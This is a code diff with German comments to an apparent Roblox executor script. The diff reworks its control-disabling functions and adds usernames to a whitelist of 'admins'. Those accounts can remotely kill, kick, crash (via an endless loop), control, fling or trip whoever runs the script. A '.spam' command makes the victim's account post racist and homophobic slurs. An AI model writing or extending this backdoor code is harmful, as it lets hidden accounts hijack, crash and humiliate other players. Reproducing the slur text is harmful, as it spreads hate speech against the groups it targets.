@@ -1,13 +1,13 @@
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
-local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
-local Controls = PlayerModule:GetControls()
+-- **Kommentiere die fehlerhafte Zeile und die Controls-Variable aus**
+-- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+-- local Controls = PlayerModule:GetControls()
 
+-- **Ersetze setControlsEnabled durch eine einfachere Funktion, die Anchored verwendet**
 local function setControlsEnabled(enabled)
-    if enabled then
-        Controls:Enable() -- Enable player controls
-    else
-        Controls:Disable() -- Disable player controls
+    if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+        Player.Character.HumanoidRootPart.Anchored = not enabled -- Umgekehrt, da true = deaktiviert
     end
 end
 
@@ -15,9 +15,9 @@ local function follow(onoff,pos)
 getgenv().flwwing = onoff
 while wait() do
 if getgenv().flwwing then
-setControlsEnabled(false)
+setControlsEnabled(false) -- Verwende die neue Funktion
 else
-setControlsEnabled(true)
+setControlsEnabled(true) -- Verwende die neue Funktion
 break
 end
 wait()
@@ -28,28 +28,28 @@ local function nameMatches(player, partialName)
     local nameLower = player.Name:lower()
     local displayNameLower = player.DisplayName:lower()
     partialName = partialName:lower()
-    
+
     -- Exact matches
     if nameLower == partialName or displayNameLower == partialName then
         return true
     end
-    
+
     -- Partial matches
     if nameLower:find(partialName, 1, true) or displayNameLower:find(partialName, 1, true) then
         return true
     end
-    
+
     return false
 end
 
 local adminCmd = {
-    "AK_ADMEN1", "I_LOVEYOU12210", "KRZXY_9", "Xeni_he07", "I_LOVEYOU11210", "AK_ADMEN2", "GYATT_DAMN1", "ddddd", "IIIlIIIllIlIllIII", "AliKhammas1234", "dgthgcnfhhbsd", "AliKhammas", "YournothimbuddyXD", "AK_ADMEN2", "29Kyooo", "ImOn_ValveIndex", "BasedLion25", "Akksosdmdokdkddmkd", "BOTGTMPStudio2", "damir123loin", "goekayhack", "goekayball", "goekayball2", "goetemp_1", "Whitelisttestingg", "Robloxian74630436", "sheluvstutu", "browhatthebadass" , "SunSetzDown"
+    "AK_ADMEN1", "I_LOVEYOU12210", "KRZXY_9", "Xeni_he07", "I_LOVEYOU11210", "AK_ADMEN2", "GYATT_DAMN1", "ddddd", "IIIlIIIllIlIllIII", "AliKhammas1234", "dgthgcnfhhbsd", "AliKhammas", "YournothimbuddyXD", "AK_ADMEN2", "BloxiAstra", "29Kyooo", "ImOn_ValveIndex", "328ml", "BasedLion25", "Akksosdmdokdkddmkd", "BOTGTMPStudio2", "damir123loin", "goekayhack", "goekayball", "goekayball2", "goetemp_1", "Whitelisttestingg", "Robloxian74630436", "sheluvstutu", "browhatthebadass" , "SunSetzDown", "TheSadMan198", "FellFlower2", "xXLuckyXx187", "lIIluckyIIII"
 }
 
 local commandsList = {
     ".rejoin", ".fast", ".normal", ".slow", ".unfloat", ".float",
     ".void", ".jump", ".trip", ".sit", ".freeze", ".unfreeze",
-    ".kick", ".kill", ".bring", ".js", ".js2", ".invert", 
+    ".kick", ".kill", ".bring", ".js", ".js2", ".invert",
     ".uninvert", ".spin", ".unspin",
     ".privland",
     ".crash", ".smartwalktome", ".walktome", ".control", ".uncontrol", ".fling",
@@ -165,7 +165,7 @@ local function executeCommand(admin, target, command)
         Chat("You cannot target yourself!")
         return
     end
-    
+
     if command == ".kill" then
         target.Character.Humanoid.Health = 0
     elseif command == ".bring" then
@@ -261,7 +261,7 @@ local rayDirection = Vector3.new(0, -10, 0)
 local raycastResult = workspace:Raycast(rayOrigin, rayDirection)
 if raycastResult then
     -- Place banana sideways with a 90-degree rotation on X axis
-    banana.CFrame = CFrame.new(raycastResult.Position) 
+    banana.CFrame = CFrame.new(raycastResult.Position)
         * CFrame.Angles(math.rad(90), math.rad(math.random(0, 360)), 0)
 else
     banana.CFrame = hrp.CFrame * CFrame.new(0, -2.5, -2)
@@ -273,25 +273,25 @@ end
         Enum.EasingStyle.Linear,
         Enum.EasingDirection.Out
     )
-    
+
     -- Move character forward
     local forwardGoal = {CFrame = hrp.CFrame * CFrame.new(0, 0, -3)} -- Move 3 studs forward
     local forwardTween = tweenService:Create(hrp, forwardTweenInfo, forwardGoal)
     forwardTween:Play()
- 
+
     -- Wait for forward movement to complete
     task.wait(0.3)
-    
+
     -- Create and configure the arc falling tween
     local fallTweenInfo = TweenInfo.new(
         0.6, -- Longer duration for arc motion
         Enum.EasingStyle.Quad,
         Enum.EasingDirection.In -- Changed to In for better arc effect
     )
-    
+
     -- Tween the character's position and rotation in an arc
     local fallGoal = {
-        CFrame = hrp.CFrame 
+        CFrame = hrp.CFrame
         * CFrame.new(0, -0.5, -4) -- Move forward and down
         * CFrame.Angles(math.rad(90), 0, 0) -- Rotate forward
     }
@@ -312,22 +312,11 @@ slipSound:Destroy()
 		if getgenv().crash then
 		while true do end
 		end
-        
+
 
 elseif command == ".smartwalktome" then
-        local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
-local Controls = PlayerModule:GetControls()
-local function setControlsEnabled(enabled)
-    if enabled then
-        Controls:Enable() -- Enable player controls
-    else
-        Controls:Disable() -- Disable player controls
-    end
-end
-local Target = admin.Character.HumanoidRootPart
-local Pathfind = game:GetService("PathfindingService")
+        -- **Keine Änderung an smartwalktome, da es PlayerModule nicht direkt verwendet**
+        local Pathfind = game:GetService("PathfindingService")
 local Humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
 local Torso = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
 local Path = Pathfind:CreatePath()
@@ -336,8 +325,8 @@ local PointArray = {}
 local Folder = Instance.new("Folder")
 Folder.Name = "Waypoints"
 Folder.Parent = workspace
-setControlsEnabled(false)
-Path:ComputeAsync(Torso.Position, Target.Position)
+setControlsEnabled(false) -- Verwende die neue Funktion
+Path:ComputeAsync(Torso.Position, admin.Character.HumanoidRootPart.Position)
 
 local Waypoints = Path:GetWaypoints()
 
@@ -368,26 +357,14 @@ for i2, v2 in ipairs(PointArray) do
     workspace.Waypoints["Point"..tostring(i2)].BrickColor = BrickColor.new("Camo")
     workspace.Waypoints["Point"..tostring(i2)].Material = "Neon"
 end
-setControlsEnabled(true)
+setControlsEnabled(true) -- Verwende die neue Funktion
 game.Workspace.Waypoints:Destroy()
         elseif command == ".walktome" then
-        
-local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
-local Controls = PlayerModule:GetControls()
 
+        -- **Keine Änderung an walktome, da es PlayerModule nicht direkt verwendet**
 local targetPart = admin.Character:WaitForChild("HumanoidRootPart") -- Replace "sdfsf" with your part's name if needed
 local character = Player.Character or Player.CharacterAdded:Wait()
 
--- Function to enable/disable controls
-local function setControlsEnabled(enabled)
-    if enabled then
-        Controls:Enable() -- Enable player controls
-    else
-        Controls:Disable() -- Disable player controls
-    end
-end
 
 -- Function to move character to a target part
 local function moveToPart(part)
@@ -395,7 +372,7 @@ local function moveToPart(part)
         local humanoid = character.Humanoid
 
         -- Disable controls
-        setControlsEnabled(false)
+        setControlsEnabled(false) -- Verwende die neue Funktion
 
         -- Move to the target part
         humanoid:MoveTo(part.Position)
@@ -407,7 +384,7 @@ local function moveToPart(part)
         end
 
         -- Re-enable controls
-        setControlsEnabled(true)
+        setControlsEnabled(true) -- Verwende die neue Funktion
     end
 end
 
@@ -427,15 +404,18 @@ for _, seat in game.Workspace:GetDescendants() do
 end
 
 game.Workspace.DescendantAdded:Connect(disableSeat)
-local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+-- **Kommentiere PlayerModule-bezogenen Code in .control aus**
+-- local Players = game:GetService("Players")
+-- local Player = Players.LocalPlayer
+-- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
 
--- Get the control module
-local Controls = PlayerModule:GetControls()
+-- -- Get the control module
+-- local Controls = PlayerModule:GetControls()
 
--- Disable controls
-Controls:Disable()
+-- -- Disable controls
+-- Controls:Disable()
+setControlsEnabled(false) -- Verwende die neue Funktion
+
 -- Ensure this script is a LocalScript
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
@@ -481,13 +461,13 @@ local velocity = Vector3.new(0, 0, 0)
 local function getFloorHeight(position)
     local rayStart = Vector3.new(position.X, position.Y + rayHeight, position.Z)
     local rayEnd = Vector3.new(position.X, position.Y - rayHeight, position.Z)
-    
+
     local raycastParams = RaycastParams.new()
     raycastParams.FilterType = Enum.RaycastFilterType.Exclude
     raycastParams.FilterDescendantsInstances = {character, targetCharacter}
-    
+
     local raycastResult = workspace:Raycast(rayStart, rayEnd - rayStart, raycastParams)
-    
+
     if raycastResult then
         return raycastResult.Position.Y + floorOffset
     end
@@ -496,41 +476,41 @@ end
 -- Main Control Loop
 RunService.RenderStepped:Connect(function(deltaTime)
     if not getgenv().controlling then return end
-    
+
     -- Safety check for character existence
     if not character.Parent or not targetCharacter.Parent then
         return
     end
-    
+
     -- Update Target Position
     targetPosition = targetHumanoidRootPart.Position
     targetCFrame = targetHumanoidRootPart.CFrame
-    
+
     -- Calculate Side Position
     local rightDirection = (targetCFrame.RightVector).Unit
     local desiredPosition = targetPosition + (rightDirection * sideOffset)
-    
+
     -- Get Floor Height at Desired Position
     local floorHeight = getFloorHeight(desiredPosition)
     desiredPosition = Vector3.new(desiredPosition.X, floorHeight, desiredPosition.Z)
-    
+
     -- Smooth Movement Calculation
     currentPos = humanoidRootPart.Position
     local newPos = currentPos:Lerp(desiredPosition, smoothingFactor)
-    
+
     -- Velocity Calculation with Speed Limit
     velocity = (newPos - currentPos) / deltaTime
     if velocity.Magnitude > maxSpeed then
         velocity = velocity.Unit * maxSpeed
     end
-    
+
     -- Apply Movement
     humanoidRootPart.Velocity = velocity
-    
+
     -- Synchronize Orientation
     local targetOrientation = targetCFrame - targetCFrame.Position
     humanoidRootPart.CFrame = CFrame.new(newPos) * targetOrientation
-    
+
     -- Force Y Velocity to prevent floating
     humanoidRootPart.Velocity = Vector3.new(
         humanoidRootPart.Velocity.X,
@@ -543,15 +523,17 @@ end)
 humanoid.Jump = false
             elseif command == ".uncontrol" then
             getgenv().controlling=false
-            local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+            -- **Kommentiere PlayerModule-bezogenen Code in .uncontrol aus**
+            -- local Players = game:GetService("Players")
+            -- local Player = Players.LocalPlayer
+            -- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
 
--- Get the control module
-local Controls = PlayerModule:GetControls()
+            -- -- Get the control module
+            -- local Controls = PlayerModule:GetControls()
 
--- Disable controls
-Controls:Enable()
+            -- -- Disable controls
+            -- Controls:Enable()
+            setControlsEnabled(true) -- Verwende die neue Funktion
             local function enableSeat(seat)
     if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
         seat.Disabled = false
@@ -583,7 +565,7 @@ game.Workspace.DescendantAdded:Connect(enableSeat)
             elseif command == ".follow" then
             follow(true,admin.Character.HumanoidRootPart.Position)
             elseif command == ".unfollow" then
-            follow(true,admin.Character.HumanoidRootPart.Position)
+            follow(false,admin.Character.HumanoidRootPart.Position) -- Korrektur: unfollow sollte false übergeben
             elseif command == ".spam" then
             Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
             Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
@@ -1083,7 +1065,7 @@ textLabel_2.TextWrapped = true
 
 -- Scripts:
 
-local function KIAWSKW_fake_script() -- ConfirmButton.LocalScript 
+local function KIAWSKW_fake_script() -- ConfirmButton.LocalScript
 	local script = Instance.new('LocalScript', ConfirmButton)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -1219,7 +1201,9 @@ game.Players.PlayerAdded:Connect(function(player)
     if table.find(adminCmd, player.Name) then
         setupAdminCommands(player)
     end
-end)local TextChatService = game:GetService("TextChatService")
+end)
+
+local TextChatService = game:GetService("TextChatService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
